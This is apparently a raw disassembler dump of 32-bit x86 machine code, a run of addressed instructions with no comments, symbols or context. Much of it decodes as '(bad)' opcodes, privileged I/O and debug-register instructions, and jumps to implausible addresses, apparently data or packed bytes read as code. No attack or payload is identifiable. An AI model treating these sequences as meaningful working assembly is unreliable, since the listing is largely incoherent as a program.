  43083f:	mov    edi,DWORD PTR [ebx]
  430841:	mov    eax,0x848bcb9c
  430846:	rcr    BYTE PTR [edx-0x7c7fcd0f],0x66
  43084d:	or     BYTE PTR [edi],cl
  43084f:	(bad)  
  430850:	dec    ebp
  430851:	inc    edi
  430852:	add    bh,0x53
  430855:	or     cl,ch
  430857:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43085d:	xchg   BYTE PTR [eax-0x1638ac64],al
  430863:	mov    esp,0xf802b588
  430868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430869:	inc    ebp
  43086a:	(bad)  
  43086b:	cmp    edi,edi
  43086d:	pushf  
  43086e:	or     DWORD PTR [ecx+0x45ffe474],0x0
  430875:	mov    ecx,DWORD PTR [ebp-0x340018]
  43087b:	into   
  43087c:	dec    DWORD PTR [ebx-0x7f72431c]
  430882:	push   0x5000ff01
  430887:	retf   
  430888:	inc    ebp
  430889:	into   
  43088a:	dec    DWORD PTR [ebx-0x343f3ff4]
  430890:	push   eax
  430891:	into   
  430892:	call   0x4b0d22
  430897:	retf   
  430898:	add    dh,cl
  43089a:	add    bh,bh
  43089c:	mov    DWORD PTR [eax+ecx*1],edx
  43089f:	clc    
  4308a0:	inc    ebp
  4308a1:	inc    ebp
  4308a2:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4308a8:	push   0x1
  4308aa:	push   edi
  4308ab:	add    BYTE PTR [eax-0x35],dl
  4308ae:	mov    ecx,esi
  4308b0:	cld    
  4308b1:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4308b7:	into   
  4308b8:	ror    BYTE PTR [ebx+0x75000800],0x50
  4308bf:	xor    eax,DWORD PTR [ebp+0x3]
  4308c2:	jne    0x430915
  4308c4:	call   DWORD PTR [eax-0x3c]
  4308c7:	mov    DWORD PTR [ecx-0x18],edx
  4308ca:	mov    edi,edi
  4308cc:	call   0x8b464e55
  4308d1:	add    ah,ah
  4308d3:	rol    BYTE PTR [ebp-0x7c],0xeb
  4308d7:	add    edi,edi
  4308d9:	add    al,ch
  4308db:	inc    ebp
  4308dc:	push   ecx
  4308dd:	cmp    cl,BYTE PTR [ebx+0x45c7c49c]
  4308e3:	mov    al,0xc7
  4308e5:	test   esp,esp
  4308e7:	clc    
  4308e8:	test   DWORD PTR [ebp-0x8],ecx
  4308eb:	add    BYTE PTR [ebp+0x53],0x34
  4308ef:	jmp    0x8bcc9190
  4308f4:	in     al,dx
  4308f5:	or     BYTE PTR [ebp-0xf],al
  4308f8:	xor    eax,DWORD PTR [eax+0x4f896603]
  4308fe:	hlt    
  4308ff:	mov    eax,DWORD PTR [ebp-0x50]
  430902:	xor    esi,ecx
  430904:	add    eax,DWORD PTR [eax+0x4f086689]
  43090a:	inc    ebp
  43090b:	adc    ebp,0x68
  43090e:	pushf  
  43090f:	inc    edi
  430911:	add    al,ch
  430913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430914:	test   edi,edi
  430916:	clc    
  430917:	inc    DWORD PTR [ebp-0x73]
  43091a:	cmp    dh,BYTE PTR [esp+ebx*4-0x1]
  43091e:	(bad)  
  43091f:	push   ecx
  430920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430921:	jne    0x4308a8
  430923:	push   eax
  430924:	clc    
  430925:	test   DWORD PTR [ebp-0x1],eax
  430928:	cmp    bh,bh
  43092a:	pushf  
  43092b:	mov    eax,edi
  43092d:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  430934:	inc    ebp
  430935:	push   edi
  430936:	sbb    bl,BYTE PTR ds:[eax+eax*1-0x7f1b9775]
  43093e:	dec    ebp
  43093f:	add    BYTE PTR [ebx],dh
  430941:	inc    ebp
  430942:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430948:	enter  0x8401,0x0
  43094c:	add    al,BYTE PTR [eax]
  43094e:	add    bh,bh
  430950:	out    dx,eax
  430951:	sbb    BYTE PTR [eax],al
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  43095a:	sub    esi,DWORD PTR [ebx]
  43095c:	mov    ebp,DWORD PTR [eax-0x8]
  43095f:	add    bl,0x0
  430962:	(bad)  
  430963:	cmp    eax,ecx
  430965:	or     BYTE PTR [edx+0x750114],al
  43096b:	inc    DWORD PTR [ebp+0x18]
  43096e:	mov    eax,DWORD PTR [ebp-0x8]
  430971:	mov    ebx,eax
  430973:	(bad)  
  430974:	retf   
  430975:	inc    ebp
  430976:	into   
  430977:	mov    esi,eax
  430979:	int3   
  43097a:	scas   eax,DWORD PTR es:[edi]
  43097b:	push   es
  43097c:	mov    esi,DWORD PTR [ebp-0xc]
  43097f:	call   DWORD PTR [ebp+0x18]
  430982:	sub    edi,DWORD PTR [ebp+0x3b]
  430985:	mov    esi,DWORD PTR [edi-0x34]
  430988:	mov    eax,DWORD PTR [ebp-0x8]
  43098b:	xor    eax,0xc7c69cc3
  430990:	mov    esp,0x8b8500dc
  430995:	clc    
  430996:	mov    esp,0x338b4d45
  43099b:	in     al,0x33
  43099d:	ret    
  43099e:	add    eax,esi
  4309a0:	add    eax,DWORD PTR [ebp+0xf]
  4309a3:	mov    eax,ecx
  4309a5:	in     al,0x4d
  4309a7:	ret    
  4309a8:	mov    eax,esi
  4309aa:	in     al,dx
  4309ab:	inc    ebp
  4309ac:	rol    edi,1
  4309ae:	sar    al,1
  4309b0:	or     BYTE PTR [ebp+0x45e9f845],al
  4309b6:	add    BYTE PTR [ebx],bh
  4309b8:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4309bf:	test   ebx,eax
  4309c1:	clc    
  4309c2:	retf   
  4309c3:	inc    ebp
  4309c4:	into   
  4309c5:	cmp    esi,eax
  4309c7:	pushf  
  4309c8:	scas   eax,DWORD PTR es:[edi]
  4309c9:	(bad)  
  4309ca:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4309d1:	inc    ebp
  4309d2:	cmp    edi,DWORD PTR [edi]
  4309d4:	ja     0x430972
  4309d6:	mov    eax,edi
  4309d8:	mov    esp,0x458567a8
  4309dd:	clc    
  4309de:	mov    eax,DWORD PTR [ebp-0x8]
  4309e1:	mov    eax,ebx
  4309e3:	in     al,dx
  4309e4:	retf   
  4309e5:	ret    
  4309e6:	into   
  4309e7:	mov    dh,0x7d
  4309ea:	scas   eax,DWORD PTR es:[edi]
  4309eb:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  4309f1:	add    BYTE PTR [ebx],ch
  4309f3:	jmp    0xba0b33
  4309f8:	mov    eax,DWORD PTR [ebp-0x5c]
  4309fb:	mov    eax,DWORD PTR [ebp-0x14]
  4309fe:	inc    ebp
  4309ff:	enter  0x458b,0xf8
  430a03:	xor    eax,ebx
  430a05:	add    ecx,ebx
  430a07:	cmp    ecx,esi
  430a09:	shufps xmm7,xmm4,0xaf
  430a0d:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430a13:	dec    ebp
  430a14:	sub    esi,DWORD PTR [ebx]
  430a16:	cmp    esi,DWORD PTR [ebx]
  430a18:	ja     0x430a1d
  430a1a:	mov    eax,DWORD PTR [ebx]
  430a1c:	lods   al,BYTE PTR ds:[esi]
  430a1d:	mov    db0,ecx
  430a20:	inc    ebp
  430a21:	dec    ebp
  430a22:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430a28:	retf   
  430a29:	rol    dh,1
  430a2b:	or     al,0xce
  430a2d:	inc    ebp
  430a2e:	scas   eax,DWORD PTR es:[edi]
  430a2f:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430a35:	add    BYTE PTR [ebx],ch
  430a37:	add    BYTE PTR [ebx],bh
  430a39:	inc    ebp
  430a3a:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430a40:	inc    ebp
  430a41:	retf   
  430a42:	mov    ecx,esi
  430a44:	clc    
  430a45:	(bad)  
  430a46:	retf   
  430a47:	scas   eax,DWORD PTR es:[edi]
  430a48:	ret    
  430a49:	mov    ecx,esi
  430a4b:	hlt    
  430a4c:	(bad)  
  430a4d:	push   ebp
  430a4e:	scas   eax,DWORD PTR es:[edi]
  430a4f:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430a55:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430a5b:	add    BYTE PTR [ebx],al
  430a5d:	mov    eax,eax
  430a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a60:	inc    ebp
  430a61:	dec    ebp
  430a62:	xor    eax,0x89339c33
  430a67:	add    edx,eax
  430a69:	add    eax,DWORD PTR [ebp+0xf]
  430a6c:	xor    al,0xc1
  430a6e:	pushf  
  430a6f:	dec    ebp
  430a70:	(bad)  
  430a71:	mov    esi,DWORD PTR [eax-0x72e7a14]
  430a77:	rol    BYTE PTR [ebp+0x5],1
  430a7a:	xor    eax,DWORD PTR [ebp+0x3]
  430a7d:	jmp    0x430a6a
  430a7f:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430a85:	xor    eax,DWORD PTR [ebp+0x33]
  430a88:	mov    eax,DWORD PTR [ebx]
  430a8a:	rol    BYTE PTR [ebx],1
  430a8c:	test   BYTE PTR [edi],cl
  430a8e:	call   0xb8b:0x884d32c1
  430a95:	in     al,dx
  430a96:	inc    ebp
  430a97:	shl    DWORD PTR [ebx],1
  430a99:	rol    BYTE PTR [ebx],1
  430a9b:	add    eax,0xeb4d45e0
  430aa0:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430aa6:	add    BYTE PTR [ebx],dh
  430aa8:	inc    ebp
  430aa9:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430aaf:	rdpmc  
  430ab1:	rol    DWORD PTR [ebx],0x4d
  430ab4:	loopne 0x430a41
  430ab6:	push   ebp
  430ab7:	in     al,dx
  430ab8:	mov    cl,dl
  430aba:	adc    eax,edx
  430abc:	jb     0x430ac3
  430abe:	add    BYTE PTR [ebp+0x45],al
  430ac1:	jmp    0x430a4e
  430ac3:	mov    ebx,eax
  430ac5:	test   al,0xcb
  430ac7:	dec    ebp
  430ac8:	dec    ebp
  430ac9:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430acf:	add    ebx,DWORD PTR [edx-0x743ecdf1]
  430ad5:	dec    ebp
  430ad6:	mov    al,0x8b
  430ad8:	dec    ebp
  430ad9:	in     al,dx
  430ada:	xor    edx,ecx
  430adc:	xor    edx,eax
  430ade:	add    eax,DWORD PTR [ebp+0x3]
  430ae1:	jbe    0x430af2
  430ae3:	mov    eax,ecx
  430ae5:	test   al,0x45
  430ae7:	dec    ebp
  430ae8:	mov    DWORD PTR [ebx],esi
  430aea:	loopne 0x430b1f
  430aec:	inc    ebp
  430aed:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430af3:	rol    esi,0x45
  430af6:	scas   eax,DWORD PTR es:[edi]
  430af7:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430afd:	mov    eax,ecx
  430aff:	hlt    
  430b00:	dec    ebp
  430b01:	inc    ebp
  430b02:	mov    eax,edi
  430b04:	loopne 0x430ade
  430b06:	retf   
  430b07:	test   esi,ecx
  430b09:	clc    
  430b0a:	scas   eax,DWORD PTR es:[edi]
  430b0b:	inc    ebp
  430b0c:	mov    eax,edi
  430b0e:	fdiv   st,st(0)
  430b10:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430b16:	call   0xf8b:0x3b9c323b
  430b1d:	fcomp  DWORD PTR [esi-0x3d]
  430b20:	inc    esi
  430b22:	mov    ebp,DWORD PTR [eax-0x10]
  430b25:	inc    ebp
  430b26:	dec    ebp
  430b27:	xor    esi,DWORD PTR [ebx]
  430b29:	add    eax,DWORD PTR [ebx]
  430b2b:	loopne 0x430b3c
  430b2d:	dec    ebp
  430b2e:	ror    DWORD PTR [edx+0x7233084d],0x3
  430b35:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430b3b:	lock call 0xf48b:0x894532c3
  430b43:	rol    BYTE PTR [ebp-0x7c],1
  430b46:	xor    ebx,DWORD PTR [edx-0x7772cd47]
  430b4c:	call   edi
  430b4e:	enter  0x4d45,0x8b
  430b52:	mov    esi,eax
  430b54:	fmul   st(3),st
  430b56:	push   ebp
  430b57:	dec    ebp
  430b58:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430b5e:	ret    0xc19a
  430b61:	xor    al,BYTE PTR [esi-0x280276]
  430b67:	dec    ebp
  430b68:	jne    0x430b9d
  430b6a:	mov    eax,DWORD PTR [ebx]
  430b6c:	cld    
  430b6d:	loopne 0x430b1f
  430b6f:	push   ebp
  430b70:	add    DWORD PTR [eax+0x72851100],ecx
  430b76:	inc    DWORD PTR [eax]
  430b78:	inc    DWORD PTR [ebp-0x75]
  430b7b:	mov    edi,esp
  430b7d:	lock add bl,0x1
  430b81:	retf   
  430b82:	add    dh,al
  430b84:	xor    dh,cl
  430b86:	inc    ebp
  430b87:	scas   eax,DWORD PTR es:[edi]
  430b88:	mov    eax,DWORD PTR [ebx]
  430b8a:	shl    al,0x0
  430b8d:	inc    ebp
  430b8e:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430b94:	call   0x461dcc
  430b99:	ud0    eax,ecx
  430b9c:	adc    al,0x4d
  430b9e:	inc    ebp
  430b9f:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430ba5:	lock push 0x338055
  430bab:	add    eax,DWORD PTR [eax]
  430bad:	ud0    ecx,edx
  430bb0:	sbb    BYTE PTR [ebp+0x5e],dl
  430bb3:	xor    ecx,ecx
  430bb5:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430bbc:	push   ecx
  430bbd:	add    BYTE PTR [ebp-0x38],cl
  430bc0:	mov    DWORD PTR [esi-0x740004],eax
  430bc6:	cld    
  430bc7:	inc    ebp
  430bc8:	xchg   ebx,eax
  430bc9:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  430bcf:	xabort 0xaf
  430bd2:	icebp  
  430bd3:	mov    esi,DWORD PTR [ebp-0x28]
  430bd6:	(bad)  
  430bd7:	retf   
  430bd8:	or     ecx,eax
  430bda:	(bad)  
  430bdb:	dec    ebp
  430bdc:	pop    es
  430bdd:	(bad)  
  430bde:	(bad)  
  430bdf:	or     BYTE PTR [esi],al
  430be1:	jb     0x430ba9
  430be3:	add    BYTE PTR [ebx],al
  430be5:	inc    ebp
  430be6:	(bad)  
  430be7:	mov    ecx,DWORD PTR [edx]
  430be9:	fadd   st(6),st
  430beb:	ret    
  430bec:	add    ah,BYTE PTR [esi-0x37]
  430bef:	int    0x55
  430bf1:	sub    ebp,esp
  430bf3:	add    edx,DWORD PTR [ecx-0x14]
  430bf6:	inc    ebp
  430bf7:	inc    ebp
  430bf8:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430bfe:	cld    
  430bff:	(bad)  
  430c00:	(bad)  
  430c01:	scas   eax,DWORD PTR es:[edi]
  430c02:	loopne 0x430c3f
  430c04:	mov    DWORD PTR [edi],ecx
  430c06:	mov    ebp,ebp
  430c08:	clc    
  430c09:	push   eax
  430c0b:	push   DWORD PTR [ebp-0x4]
  430c0e:	mov    BYTE PTR [ebp+0xa],0xff
  430c12:	(bad)  
  430c13:	int3   
  430c14:	or     BYTE PTR [eax],al
  430c16:	(bad)  
  430c17:	lea    eax,[edi]
  430c19:	ins    BYTE PTR es:[edi],dx
  430c1a:	(bad)  
  430c1b:	inc    DWORD PTR [ecx]
  430c1d:	push   eax
  430c1e:	mov    BYTE PTR [ebp+0x9],0x8b
  430c22:	leave  
  430c23:	les    edx,FWORD PTR [ebp+0x0]
  430c26:	in     al,dx
  430c27:	call   DWORD PTR [ecx-0x75]
  430c2a:	inc    ebp
  430c2b:	cld    
  430c2c:	mov    DWORD PTR [eax+0x8b01fc],eax
  430c32:	cld    
  430c33:	xor    BYTE PTR [esi-0x76a8f98b],bh
  430c39:	sti    
  430c3a:	mov    eax,DWORD PTR [eax]
  430c3c:	clc    
  430c3d:	test   eax,esi
  430c3f:	je     0x430cb6
  430c41:	mov    eax,esi
  430c43:	cld    
  430c44:	add    al,0x80
  430c46:	add    WORD PTR [ecx+0x0],ax
  430c4a:	fadd   DWORD PTR [eax]
  430c4c:	mov    BYTE PTR [eax],0xd4
  430c4f:	push   0xffffffc3
  430c51:	push   edi
  430c52:	mov    edx,DWORD PTR [eax+0x51]
  430c55:	pop    edi
  430c56:	lea    ebx,[ebx-0x8]
  430c59:	ret    0x45
  430c5c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c62:	xchg   eax,edi
  430c64:	mov    DWORD PTR [ebp-0x75],ecx
  430c67:	push   esi
  430c68:	clc    
  430c69:	jne    0x430c3b
  430c6b:	mov    ecx,0xf8450b0b
  430c70:	(bad)  
  430c71:	push   cs
  430c72:	or     BYTE PTR [ebp-0x3a],dh
  430c75:	cmp    eax,DWORD PTR [ecx]
  430c77:	pop    esi
  430c78:	(bad)  
  430c79:	or     al,0x5
  430c7b:	inc    eax
  430c7c:	leave  
  430c7d:	call   0x21994e86
  430c82:	iret   
  430c83:	inc    eax
  430c84:	leave  
  430c85:	jmp    0xd8ce4d89
  430c8a:	mov    eax,DWORD PTR [edx-0x3a]
  430c8d:	jl     0x430c83
  430c8f:	inc    eax
  430c90:	nop
  430c91:	loop   0x430c92
  430c93:	ret    
  430c94:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c9a:	add    eax,0xff45e8f8
  430c9f:	push   esi
  430ca0:	push   DWORD PTR [ebp-0x39]
  430ca3:	mov    eax,0x7e9da46
  430ca8:	or     al,0x6
  430caa:	push   DWORD PTR [ebp-0x3a]
  430cad:	cmp    eax,DWORD PTR [edx]
  430caf:	pop    esi
  430cb0:	ret    
  430cb1:	or     al,0x56
  430cb3:	inc    ecx
  430cb4:	push   ebp
  430cb5:	jl     0x430ca3
  430cb7:	inc    edx
  430cb8:	inc    ebp
  430cb9:	leave  
  430cba:	add    DWORD PTR [ecx+0x28],eax
  430cbd:	and    esp,edi
  430cbf:	inc    ecx
  430cc0:	jne    0x430ca9
  430cc2:	add    DWORD PTR [edx+0x1c],eax
  430cc5:	enter  0xc38b,0x14
  430cc9:	mov    edx,DWORD PTR [edx-0x17275af]
  430ccf:	clc    
  430cd0:	enter  0xd345,0x56
  430cd4:	div    DWORD PTR [ebp+0x50]
  430cd7:	mov    eax,0x7c80ece
  430cdc:	rol    DWORD PTR [esi],cl
  430cde:	div    DWORD PTR [ebp+0x50]
  430ce1:	cmp    ecx,edx
  430ce3:	pop    esi
  430ce4:	dec    BYTE PTR [edx]
  430ce6:	in     al,dx
  430ce7:	inc    edx
  430ce8:	sub    ebp,ebp
  430cea:	inc    eax
  430ceb:	(bad)  
  430cec:	push   eax
  430ced:	add    edx,DWORD PTR [eax-0x13]
  430cf0:	push   edi
  430cf1:	add    dh,dh
  430cf3:	leave  
  430cf4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430cf8:	add    BYTE PTR [ecx+0x0],dl
  430cfb:	inc    ebp
  430cfc:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430d02:	add    BYTE PTR [eax-0x7fbf448],bh
  430d08:	add    al,0x2
  430d0a:	jmp    0x57eb864
  430d0f:	jne    0x430cf9
  430d11:	mov    eax,DWORD PTR [edx]
  430d13:	or     BYTE PTR [eax],al
  430d15:	inc    ecx
  430d16:	stc    
  430d17:	jmp    0xe7824d52
  430d1c:	jge    0x430d5f
  430d1e:	mov    esi,ebp
  430d20:	lock ret 0x7d
  430d24:	and    ecx,DWORD PTR [ebx-0x171777]
  430d2a:	add    bh,bh
  430d2c:	aad    0xd7
  430d2e:	add    dh,cl
  430d30:	clts   
  430d32:	(bad)  
  430d33:	call   0xffce0c38
  430d38:	hlt    
  430d39:	iret   
  430d3a:	jge    0x430d12
  430d3c:	rol    DWORD PTR [esi-0x80],cl
  430d3f:	cmc    
  430d40:	or     BYTE PTR [edi-0x27],cl
  430d43:	(bad)  
  430d44:	out    dx,al
  430d45:	mov    eax,DWORD PTR [ebx]
  430d47:	(bad)  
  430d48:	pop    esi
  430d49:	push   es
  430d4a:	cmp    al,0xe8
  430d4c:	sar    edi,0x8
  430d4f:	inc    DWORD PTR [edi]
  430d51:	inc    esi
  430d52:	(bad)  
  430d53:	loop   0x430dd3
  430d55:	push   edi
  430d56:	push   cs
  430d57:	push   ebx
  430d58:	add    BYTE PTR [ebx+0x24008b56],cl
  430d5e:	add    BYTE PTR [ebp+0x50],al
  430d61:	push   eax
  430d62:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d68:	sub    edx,DWORD PTR [esi-0x24]
  430d6b:	jne    0x430d23
  430d6d:	lods   eax,DWORD PTR ds:[esi]
  430d6e:	mov    edx,DWORD PTR [edx-0x34]
  430d71:	dec    esi
  430d72:	out    0x83,eax
  430d74:	into   
  430d75:	push   edi
  430d77:	loopne 0x430d47
  430d79:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d7d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d84:	rol    DWORD PTR [edx],0x8
  430d87:	mov    esp,ecx
  430d89:	cmp    DWORD PTR [ebx],0xc
  430d8c:	mov    esi,0x5001c0
  430d91:	push   eax
  430d92:	push   cs
  430d93:	push   eax
  430d94:	(bad)  
  430d95:	sub    edx,edi
  430d97:	push   esi
  430d98:	adc    al,0xcb
  430d9a:	ins    DWORD PTR es:[edi],dx
  430d9b:	mov    eax,0x203e8
  430da0:	add    al,ah
  430da2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430da9:	add    dh,al
  430dab:	add    ah,ch
  430dad:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430db3:	pop    ecx
  430db4:	or     eax,ebx
  430db6:	cli    
  430db7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430dbd:	lea    ebp,[ebx]
  430dbf:	mov    edx,DWORD PTR [edx-0x4]
  430dc2:	dec    ecx
  430dc3:	inc    ebp
  430dc4:	shr    BYTE PTR [ebx],0x4b
  430dc7:	and    al,0x0
  430dc9:	(bad)  
  430dca:	jne    0x430e11
  430dcc:	pop    eax
  430dcd:	mov    al,0x5a
  430dcf:	call   0x142102e
  430dd4:	and    al,0x85
  430dd6:	push   edx
  430dd7:	add    BYTE PTR [eax+eax*1+0x0],ah
  430ddb:	dec    ebp
  430ddc:	mov    cl,0x23
  430dde:	jmp    0x430dcc
  430de0:	mov    al,0xe7
  430de2:	call   0x13910d0
  430de7:	shr    DWORD PTR [eax+ebx*2],cl
  430dea:	lock (bad) 
  430dec:	adc    eax,0x757f008d
  430df1:	out    0x58,eax
  430df3:	cmp    al,0x7
  430df5:	pop    edx
  430df6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dfd:	push   ecx
  430dfe:	cld    
  430dff:	mov    esi,0x3b0175
  430e04:	and    al,0xb0
  430e06:	xor    BYTE PTR [edx+0x1],0x8b
  430e0a:	add    ah,bh
  430e0c:	mov    edi,DWORD PTR [ebp-0x4]
  430e0f:	psubsw mm7,QWORD PTR [edi]
  430e12:	add    DWORD PTR [ebp+0x0],ebp
  430e15:	rcr    eax,1
  430e17:	mov    edi,ecx
  430e19:	and    eax,DWORD PTR [eax]
  430e1b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430e21:	call   0x130110a
  430e26:	add    al,cl
  430e28:	mov    ebp,esi
  430e2a:	aam    0x83
  430e2c:	or     DWORD PTR [ecx],eax
  430e2e:	jne    0x430e21
  430e30:	mov    eax,DWORD PTR [eax]
  430e32:	aam    0x0
  430e34:	dec    ebp
  430e35:	jne    0x430dc2
  430e37:	cmp    ebx,eax
  430e39:	jb     0x430e88
  430e3b:	jmp    0x430dc8
  430e3d:	mov    ebx,esp
  430e3f:	int3   
  430e40:	dec    ebp
  430e41:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430e48:	mov    edx,0x8b0a8b
  430e4d:	cmp    ecx,DWORD PTR [eax]
  430e4f:	jb     0x430e28
  430e51:	pop    edx
  430e52:	push   edi
  430e53:	cli    
  430e54:	pop    es
  430e55:	mov    eax,ecx
  430e57:	jb     0x430e5b
  430e59:	add    DWORD PTR [ebx],0xa
  430e5c:	mov    eax,DWORD PTR [ebx]
  430e5e:	int3   
  430e5f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e65:	jmp    0x430df2
  430e67:	mov    al,0xe8
  430e69:	call   0x10410eb
  430e6e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e71:	pop    edi
  430e72:	or     BYTE PTR [ecx-0x73],bl
  430e75:	pop    ecx
  430e76:	inc    edi
  430e77:	xor    al,0xeb
  430e79:	push   ecx
  430e7a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e80:	call   0xb20f85
  430e85:	int3   
  430e86:	sbb    BYTE PTR [esi],ch
  430e88:	inc    ebp
  430e89:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e8f:	call   0x9c10fe
  430e94:	or     BYTE PTR [ebx-0x73],dl
  430e97:	cmp    al,0x47
  430e99:	mov    al,0x1
  430e9b:	jb     0x430e9d
  430e9d:	mov    al,0x10
  430e9f:	push   eax
  430ea0:	add    al,0x75
  430ea2:	add    BYTE PTR [ebx],ch
  430ea4:	add    ebx,esp
  430ea6:	int3   
  430ea7:	jne    0x430eb9
  430ea9:	movsx  edx,cl
  430eac:	add    DWORD PTR [eax],eax
  430eae:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430eb5:	mov    gs,edi
  430eb7:	add    BYTE PTR [eax-0x50],ch
  430eba:	add    al,ch
  430ebc:	mov    eax,DWORD PTR [ecx]
  430ebe:	sub    eax,DWORD PTR [eax]
  430ec0:	jb     0x430f37
  430ec2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ec6:	jge    0x430eb0
  430ec8:	add    al,0x1
  430eca:	add    DWORD PTR [eax],0x0
  430ecd:	jne    0x430ecf
  430ecf:	je     0x430f16
  430ed1:	mov    eax,DWORD PTR [edi]
  430ed3:	ror    BYTE PTR [ebp+0x4d],1
  430ed6:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430edd:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430ee3:	mov    DWORD PTR [ebx],ebp
  430ee5:	fadd   DWORD PTR [eax+0x75]
  430ee8:	inc    eax
  430ee9:	pop    eax
  430eea:	lea    ebx,[ecx+0x4f]
  430eed:	push   0xb1000003
  430ef2:	out    dx,eax
  430ef3:	add    ebp,DWORD PTR [edx+edx*2]
  430ef6:	add    BYTE PTR [ebx+ecx*4],bh
  430ef9:	mov    ch,BYTE PTR [ebx]
  430efb:	jb     0x430f6f
  430efd:	add    al,0x89
  430eff:	push   eax
  430f00:	call   0x842b5c72
  430f05:	add    DWORD PTR [eax+eax*1],eax
  430f08:	jae    0x430f1e
  430f0a:	icebp  
  430f0b:	inc    ebp
  430f0c:	mov    eax,DWORD PTR gs:[ecx]
  430f0f:	int3   
  430f10:	out    dx,al
  430f11:	loopne 0x430f60
  430f13:	sub    eax,DWORD PTR [edx]
  430f15:	push   0xffffff83
  430f17:	pop    esi
  430f18:	push   cs
  430f19:	jl     0x430f34
  430f1b:	add    al,0xaf
  430f1d:	xor    eax,0x832b6d00
  430f22:	mov    eax,DWORD PTR [edx]
  430f24:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430f2a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430f30:	inc    ebp
  430f31:	shr    ebx,0x3
  430f34:	or     DWORD PTR [eax],0x4
  430f37:	push   0xffffffa5
  430f39:	pop    esi
  430f3a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430f41:	jmp    0x430fa0
  430f43:	mov    edi,0xff0272
  430f48:	fdivr  QWORD PTR [ebp+0x5d]
  430f4b:	push   0x4e
  430f4d:	pop    ecx
  430f4e:	call   0x435353
  430f53:	mov    DWORD PTR [ebx],eax
  430f55:	in     al,0xc8
  430f57:	rol    BYTE PTR [ebp-0x75],0xc1
  430f5b:	call   0xad113c
  430f60:	pop    esi
  430f61:	enter  0xceff,0x8b
  430f65:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f69:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f70:	je     0x430f72
  430f72:	or     DWORD PTR [ebx-0x74183b24],eax
  430f78:	jne    0x430f5e
  430f7a:	jmp    0x430f75
  430f7c:	push   DWORD PTR [edx-0x24]
  430f7f:	push   0x4d
  430f81:	pop    ecx
  430f82:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f86:	jge    0x430f8e
  430f88:	mov    eax,eax
  430f8a:	sub    ebp,DWORD PTR [edx+0x24]
  430f8d:	pop    esi
  430f8e:	inc    ebp
  430f8f:	mov    esp,0x8b6077
  430f94:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f9a:	lods   al,BYTE PTR ds:[esi]
  430f9b:	add    BYTE PTR [ebx],bh
  430f9d:	enter  0xce73,0x49
  430fa1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430fa9:	stc    
  430faa:	jge    0x43101e
  430fac:	jnp    0xdd42931b
  430fb2:	call   0xc61088
  430fb7:	fadd   st(0),st
  430fb9:	dec    esi
  430fba:	ins    BYTE PTR es:[edi],dx
  430fbb:	stc    
  430fbc:	cmp    al,0x73
  430fbe:	push   ebp
  430fbf:	mov    eax,0xf8028b
  430fc4:	jne    0x430f87
  430fc6:	mov    esi,ecx
  430fc8:	mov    esp,DWORD PTR [ebp+0x2c]
  430fcb:	add    edi,DWORD PTR [ebp-0x24]
  430fce:	sub    esp,eax
  430fd0:	and    al,0x45
  430fd2:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
